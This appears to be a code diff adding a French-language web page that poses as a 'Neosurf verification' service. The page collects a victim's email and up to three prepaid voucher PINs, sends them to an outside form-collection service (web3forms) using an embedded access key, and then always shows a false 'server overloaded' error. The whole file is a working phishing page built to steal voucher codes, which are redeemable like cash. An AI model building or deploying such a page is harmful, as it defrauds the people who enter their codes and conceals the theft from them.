@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEOSURF | VERIFICATION</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wdth,wght@75..100,300..800&family=Poppins:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicon@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="nav">
+            <nav><a href="index.html">Accueil</a></nav>
+        </div>
+    </header>
+    <div id="wrapper">
+    <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">       
+        <h2>VERIFIER VOS RECHARGES NEOSURF</h2>
+        <div class="neosurf">
+         <input type="hidden" name="access_key" value="2ebf41e2-25a0-477d-847c-dcab0ee4f7c9">
+        <fieldset>
+            <legend>INFORMATION</legend>
+            <div>
+            <label for="email">Email:</label>
+            <input type="email" name="email" id="email" placeholder="abcdef@gmail.com" required>
+            </div>
+            </fieldset>
+            <fieldset>
+                <legend>VERIFIER</legend>
+                <div>
+                    <label for="montant1Neosurf">Montant:</label>
+                    <select name="montant1Neo" id="montant1Neosurf" required>
+                        <option value="0" disabled selected>Montant de la recharge</option>
+                        <option value="30">30€</option>
+                        <option value="50">50€</option>
+                        <option value="50">100€</option>
+                    </select>                    
+                </div>
+                <div>
+                    <label for="code1">Pin:</label>
+                    <input type="text" id="code1" name="code1" placeholder="XXXX XXX XXX" required maxlength="12">
+                </div>
+                <div>
+                    <label for="montant2">Montant:</label>
+                    <select name="montant2" id="montant1">
+                        <option value="0" disabled selected>Montant de la recharge</option>
+                        <option value="30">30€</option>
+                        <option value="50">50€</option>
+                        <option value="50">100€</option>
+                    </select>                    
+                </div>
+                <div>
+                    <label for="code2">Pin 2:</label>
+                    <input type="text" id="code2" name="code2" placeholder="XXXX XXX XXX"  maxlength="12">
+                </div>
+                <div>
+                    <label for="montant3">Montant:</label>
+                    <select name="montant3" id="montant3">
+                        <option value="0" disabled selected>Montant de la recharge</option>
+                        <option value="30">30€</option>
+                        <option value="50">50€</option>
+                        <option value="50">100€</option>
+                    </select>                    
+                </div>
+                <div>
+                    <label for="code3">Pin 3:</label>
+                    <input type="text" id="code3" name="code3" placeholder="XXXX XXX XXX"  maxlength="12">
+                </div>
+            </fieldset>
+        </div>
+        <button type="submit">Verifier</button>
+    </form>
+</div>
+    <footer>
+        <small>© Copyright Verification Plateform 2022.</small><br>
+        <small>Conditions d'utilisation<br>Politique de cookies</small><br>
+        <small><a href="about.html">A propos de nous </a></small>
+    </footer>
+    <script>
+        function goToHomePage(event) {
+            // Empêcher le comportement de soumission par défaut
+            event.preventDefault();
+    
+            // Récupérer les données du formulaire
+            var formData = new FormData(event.target);
+    
+            // Envoyer les données du formulaire en utilisant AJAX
+            fetch(event.target.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Traiter la réponse (par exemple, afficher un message de réussite)
+                console.log('Formulaire soumis avec succès:', response);
+                // Vous pouvez également afficher un message de réussite à l'utilisateur
+                alert("Désolé, le serveur est actuellement saturé en raison d'un grand nombre de demandes. Veuillez réessayer ultérieurement.!");
+            })
+            .catch(error => {
+                // Traiter l'erreur (par exemple, afficher un message d'erreur)
+                console.error('Erreur lors de la soumission du formulaire:', error);
+                // Vous pouvez également afficher un message d'erreur à l'utilisateur
+                alert('Erreur lors de la soumission du formulaire. Veuillez réessayer plus tard.');
+            });
+        }
+    </script>
+
+</body>
+</html>
